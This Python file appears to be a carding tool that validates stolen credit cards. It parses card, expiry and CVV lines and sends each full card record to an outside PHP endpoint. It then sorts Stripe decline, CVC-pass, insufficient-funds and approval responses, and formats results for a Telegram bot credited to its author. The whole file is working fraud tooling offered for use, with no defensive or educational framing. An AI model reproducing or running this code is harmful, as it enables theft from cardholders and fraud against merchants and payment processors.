import requests,time

def luhn_check(card_number):
	digits = [int(digit) for digit in card_number.replace(" ", "")][::-1]
	checksum = 0
	for i, digit in enumerate(digits):
		if i % 2 == 1:
			digit *= 2
			if digit > 9:
				  	digit -= 9
		checksum += digit
	return checksum % 10 == 0

def process_card(card_data):
	start_time = time.time()
	session = requests.Session()
	try:
		cc, mes, ano, cvv = map(str.strip, card_data.split('|'))
		if not luhn_check(cc): return f"{card_data}","Faild in luhn check",False,"5",None
	except Exception:
		return f"{card_data}","Bad Format",False,"5",None
	card = card_data
	last4 = cc[-4:]
	if cc.startswith("4"):
		card_brand = "Visa"
	elif cc.startswith("5"):
		card_brand = "MasterCard"
	else:
		card_brand = "None"
	if mes.startswith("0"):
		mes = mes.lstrip("0")
#——————————————————————#
	try:
		card.replace("\r","")
		response2 = session.post("http://alflim.org/mos999/ss.php?lista="+card_data)
	except Exception:
		print(response2.text)
		end_time = time.time()
		execution_time = end_time - start_time
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	 """
		return f"{card_data}",f"{msg_text}",False,5,f"{bot_msg}"
#——————————————————————#
	response2_text = response2.text
	end_time = time.time()
	execution_time = end_time - start_time
	print(response2_text)
	send_by_bot = False
	msg_text = response2.json()["Response"]
	status = response2.json()["Status"]
	add_num = 5
	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══
	{response2.text}	 """
	if "Your card was declined." in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	 """
	elif "incorrect_number" in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	"""
	elif "Your card's expiration month is invalid." in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	 """
	elif "incorrect_zip" in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	  """
	
	elif "Error updating default payment method. Your card was declined." in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	"""
#——————————————————————#
	elif "Your card's security code is incorrect" in response2_text or "security code is invalid." in response2_text or "Your card's security code is incorrect" in response2_text or "security code is invalid." in response2_text or "incorrect_cvc" in response2_text:
		msg_text = response2.json()["Response"]
		send_by_bot = True
		bot_msg = f"""	
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	"""
		add_num = 4
#——————————————————————#
	elif "Your card has insufficient funds." in response2_text:
		msg_text = response2.json()["Response"]
		send_by_bot = True
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	 """
		add_num = 3
		
	elif "Approved" in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
		send_by_bot = True
		
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : {status}
⌬ ʀᴇsᴘᴏɴsᴇ : succeeded
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	"""
		add_num = 1
		
	elif "transaction_not_allowed" in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
#		send_by_bot = True
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	 """
		add_num = 2
		
	elif "Your card is not supported." in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
#		send_by_bot = True
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	"""
		add_num = 2
		
	elif """"cvc_check": "pass"'""" in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
		send_by_bot = True
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ : cvc_check:pass
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	 """
		add_num = 2
		
	elif "Your card does not support this type of purchase." in response2_text:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
#		send_by_bot = True
		add_num = 2
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs: {status}
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	  """
	elif """"next_action": {
		"type": "use_stripe_sdk",""" in response2_text or "stripe_3ds2_fingerprint" in response2_text or "OTP" in response2_text:
		add_num = 6
		msg_text = "OTP"
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : OTP ❌
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══
	
	"""
	else:
		msg_text = response2.json()["Response"]
		status = response2.json()["Status"]
		bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══	  """
		#print(response2.text)
		return f"{card_data}",msg_text,send_by_bot,5,f"{bot_msg}"
		
	return f"{card_data}",f"{msg_text}",send_by_bot,add_num,f"{bot_msg}"
	
	
